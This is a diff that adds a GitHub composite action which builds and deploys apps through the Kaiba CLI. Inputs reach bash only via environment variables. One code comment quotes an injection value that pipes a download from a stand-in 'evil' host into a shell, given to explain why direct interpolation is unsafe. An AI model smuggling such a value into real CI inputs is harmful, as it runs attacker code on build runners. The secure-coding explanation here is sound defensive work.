@@ -1,0 +1,97 @@
+name: 'Kaiba build & deploy'
+description: 'Build an app image to your Kaiba registry and deploy it to your dev environment.'
+branding:
+  icon: 'upload-cloud'
+  color: 'blue'
+
+# This file is the whole action. It wraps the published @kaiba-cloud/cli via npx,
+# so the action repo needs nothing else — no bundled dist, no build on release.
+# To publish it as `ai-kaiba/kaiba-action@v1`: copy this file to the ROOT of a
+# public repo named kaiba-action and tag it v1 (see the CLI README).
+
+inputs:
+  command:
+    description: 'build | deploy | status'
+    required: true
+  api-token:
+    description: 'A scoped Kaiba deploy token (store it as a secret).'
+    required: true
+  hub-url:
+    description: 'Kaiba hub URL. Defaults to https://cloud.kaiba.ai.'
+    required: false
+  cli-version:
+    description: 'Version of @kaiba-cloud/cli to run. Pin it for reproducible builds.'
+    required: false
+    default: '0.1.0'
+  # build inputs
+  repo:
+    description: 'Git repository URL to build (build).'
+    required: false
+  branch:
+    description: 'Branch or commit ref to build (build).'
+    required: false
+  image:
+    description: 'Image name within your registry (build), or full image ref (deploy).'
+    required: false
+  tag:
+    description: 'Image tag (build). Pass the commit SHA.'
+    required: false
+  dockerfile:
+    description: 'Dockerfile path (build). Default "Dockerfile".'
+    required: false
+  context:
+    description: 'Build context subdir (build). Default ".".'
+    required: false
+  git-token:
+    description: 'Token for a private clone (build). Usually secrets.GITHUB_TOKEN.'
+    required: false
+  # deploy inputs
+  service:
+    description: 'Compose service name to retarget (deploy, or build with chained deploy).'
+    required: false
+
+runs:
+  using: 'composite'
+  steps:
+    - name: Run kaiba
+      shell: bash
+      # Every input reaches bash ONLY through the environment — never interpolated
+      # into the script body. Interpolating `${{ inputs.* }}` into `run:` would let
+      # a value like `"; curl evil | sh; "` execute on the runner (CWE-94). The
+      # values are read as quoted shell variables below, which cannot break out.
+      env:
+        KAIBA_API_TOKEN: ${{ inputs.api-token }}
+        KAIBA_HUB_URL: ${{ inputs.hub-url }}
+        IN_CLI_VERSION: ${{ inputs.cli-version }}
+        IN_COMMAND: ${{ inputs.command }}
+        IN_REPO: ${{ inputs.repo }}
+        IN_BRANCH: ${{ inputs.branch }}
+        IN_IMAGE: ${{ inputs.image }}
+        IN_TAG: ${{ inputs.tag }}
+        IN_DOCKERFILE: ${{ inputs.dockerfile }}
+        IN_CONTEXT: ${{ inputs.context }}
+        IN_GIT_TOKEN: ${{ inputs.git-token }}
+        IN_SERVICE: ${{ inputs.service }}
+      run: |
+        set -euo pipefail
+        add() { [ -n "${2:-}" ] && ARGS+=("--$1" "$2") || true; }
+        ARGS=()
+        case "$IN_COMMAND" in
+          build)
+            add repo "$IN_REPO"
+            add branch "$IN_BRANCH"
+            add image "$IN_IMAGE"
+            add tag "$IN_TAG"
+            add dockerfile "$IN_DOCKERFILE"
+            add context "$IN_CONTEXT"
+            add git-token "$IN_GIT_TOKEN"
+            add deploy-service "$IN_SERVICE"
+            ;;
+          deploy)
+            add service "$IN_SERVICE"
+            add image "$IN_IMAGE"
+            ;;
+          status) ;;
+          *) echo "Unknown command: $IN_COMMAND" >&2; exit 1 ;;
+        esac
+        npx -y "@kaiba-cloud/cli@${IN_CLI_VERSION:-latest}" "$IN_COMMAND" ${ARGS[@]+"${ARGS[@]}"}
